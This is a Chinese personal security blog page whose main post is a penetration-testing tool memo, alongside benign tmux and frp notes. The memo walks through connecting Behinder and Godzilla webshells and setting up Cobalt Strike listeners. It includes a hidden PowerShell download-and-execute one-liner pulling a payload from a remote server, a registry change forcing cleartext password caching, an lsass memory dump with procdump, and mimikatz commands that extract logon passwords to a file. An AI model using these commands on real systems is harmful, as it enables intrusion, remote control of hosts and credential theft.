<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure>

<p>拒绝访问——&gt;存在域，当前用户不是域用户</p>
<p>命令成功完成——&gt;存在域，且当前用户是域用户</p>
<p>工作组——&gt;找不到域</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/18/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%A4%87%E5%BF%98%E5%BD%95-shell%E5%B7%A5%E5%85%B7%E7%AF%87/">渗透工具备忘录</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-18</time><div class="content"><h2 id="webshell工具"><a href="#webshell工具" class="headerlink" title="webshell工具"></a>webshell工具</h2><h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><p>冰蝎的连接较为简单：<br>输入url和密码以后选择脚本类型即可上线</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220418212525.png" alt="image-20220418212525168"></p>
<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><h4 id="哥斯拉马生成"><a href="#哥斯拉马生成" class="headerlink" title="哥斯拉马生成"></a>哥斯拉马生成</h4><p>管理——&gt;生成——&gt;生成对应的马并选择有效载荷和加密器</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220418220633.png" alt="image-20220418220633085"></p>
<h4 id="哥斯拉马连接："><a href="#哥斯拉马连接：" class="headerlink" title="哥斯拉马连接："></a>哥斯拉马连接：</h4><p>这里需要注意的是要记得配置代理，否则会链接失败，并且加密器要和刚才的对应</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220418220559.png" alt="image-20220418220559912"></p>
<h3 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h3><p>将CS上传至公网服务器，执行一下就可以启动，接下来将此IP以及密码填入即可，然后端口是50050</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220419183004.png" alt="image-20220419183004280"></p>
<h3 id="获取beacon"><a href="#获取beacon" class="headerlink" title="获取beacon"></a>获取beacon</h3><h4 id="创建listener"><a href="#创建listener" class="headerlink" title="创建listener"></a>创建listener</h4><p>点击cobalt strike——&gt;listeners——&gt;Add（这里的端口需要设置成服务器上未使用的端口）</p>
<h4 id="web-Delivery-执行payload"><a href="#web-Delivery-执行payload" class="headerlink" title="web Delivery 执行payload"></a>web Delivery 执行payload</h4><p>选择scripted web delivery，然后生成payload</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220419192003.png" alt="image-20220419192003622"></p>
<p>接下来进行launch即可</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220419192043.png" alt="image-20220419192042891"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;110.42.xxxx:8888&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure>

<h4 id><a href="#" class="headerlink" title></a><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220419191939.png" alt="image-20220419191939517"></h4><p>然后右键单击进行interact即可执行命令</p>
<h2 id="tmux快捷键操作"><a href="#tmux快捷键操作" class="headerlink" title="tmux快捷键操作"></a>tmux快捷键操作</h2><p>发现tmux大家介绍的不错，所以想尝试一下，但发现无论ctrl+a，还是ctrl+b都不好使，经过一番努力后才发现应该是ctrl+b松开后再按其他键。例如ctrl+b ？，应该先同时按ctrl+b 松开后，shift+/（即输入？）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看有所有tmux会话</span><br><span class="line">指  令：tmux ls</span><br><span class="line">快捷键：Ctrl+b s</span><br><span class="line"></span><br><span class="line"># 新建tmux窗口</span><br><span class="line">指  令：tmux new -s &lt;session-name&gt;</span><br><span class="line"></span><br><span class="line"># 重命名会话</span><br><span class="line">指  令：tmux rename-session -t &lt;old-name&gt; &lt;new-name&gt;</span><br><span class="line">快捷键：Ctrl+b $</span><br><span class="line"></span><br><span class="line"># 分离会话</span><br><span class="line">指  令：tmux detach  或者使用  exit(关闭窗口)</span><br><span class="line">快捷键：Ctrl+b d</span><br><span class="line"></span><br><span class="line"># 重新连接会话</span><br><span class="line">指  令：tmux attach -t &lt;session-name&gt;  或者使用 tmux at -t &lt;session-name&gt;</span><br><span class="line"></span><br><span class="line">#平铺当前窗格（个人很喜欢的快捷键，注意：平铺的是当前选中的窗格）</span><br><span class="line">快捷键：Ctrl+b z (再次 Ctrl+b z 则恢复)</span><br><span class="line"></span><br><span class="line"># 杀死会话</span><br><span class="line">指  令：tmux kill-session -t &lt;session-name&gt;</span><br><span class="line"></span><br><span class="line"># 切换会话</span><br><span class="line">指  令：tmux switch -t &lt;session-name&gt;</span><br><span class="line"></span><br><span class="line"># 划分上下两个窗格</span><br><span class="line">指  令：tmux split</span><br><span class="line">快捷键：Ctrl+b “</span><br><span class="line"></span><br><span class="line"># 划分左右两个窗格</span><br><span class="line">指  令：tmux split -h</span><br><span class="line">快捷键：Ctrl+b %</span><br><span class="line"></span><br><span class="line"># 光标切换到上方窗格</span><br><span class="line">指  令：tmux select-pane -U</span><br><span class="line">快捷键：Ctrl+b 方向键上</span><br><span class="line"></span><br><span class="line"># 光标切换到下方窗格</span><br><span class="line">指  令：tmux select-pane -D</span><br><span class="line">快捷键：Ctrl+b 方向键下</span><br><span class="line"></span><br><span class="line"># 光标切换到左边窗格</span><br><span class="line">指  令：tmux select-pane -L</span><br><span class="line">快捷键：Ctrl+b 方向键左</span><br><span class="line"></span><br><span class="line"># 光标切换到右边窗格</span><br><span class="line">指  令：tmux select-pane -R</span><br><span class="line">快捷键：Ctrl+b 方向键右</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/svap1/article/details/39694713">https://blog.csdn.net/svap1/article/details/39694713</a></p>
<h2 id="frp代理配置"><a href="#frp代理配置" class="headerlink" title="frp代理配置"></a>frp代理配置</h2><p>首先配置一下服务器的代理，删除frpc 和 frpc.ini，编辑frps.ini</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220420220807.png" alt="image-20220420220807853"></p>
<p>frpc.ini配置，如果换了vps 改一下ip即可</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220420220700.png" alt="image-20220420220653329" style="zoom:67%;">

<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;frps -c frps.ini	#启用服务端frp</span><br></pre></td></tr></table></figure>

<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><p><strong>注意：</strong><br>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br></pre></td></tr></table></figure>

<h3 id="windows2003"><a href="#windows2003" class="headerlink" title="windows2003"></a>windows2003</h3><p>使用管理员身份运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">#抓取密码</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p>
<p>cmd修改注册表命令：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">Copyreg <span class="keyword">add</span><span class="bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span></span><br><span class="line"><span class="comment">#重启或用户重新登录后可以成功抓取</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz # log</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<h3 id="获取高版本windows系统的密码凭证-procdump导出"><a href="#获取高版本windows系统的密码凭证-procdump导出" class="headerlink" title="获取高版本windows系统的密码凭证(procdump导出)"></a>获取高版本windows系统的密码凭证(procdump导出)</h3><p>使用procdump将lsass dump下来（需要管理员权限）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe 1.dmp</span><br></pre></td></tr></table></figure>

<p>将lsass.dmp下载到本地后，然后执行mimikatz:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Copymimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>为了方便复制与查看，可以输出到本地文件里面：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Copymimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> &gt; pssword.txt</span><br></pre></td></tr></table></figure>



<h2 id="crackmap"><a href="#crackmap" class="headerlink" title="crackmap"></a>crackmap</h2></div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>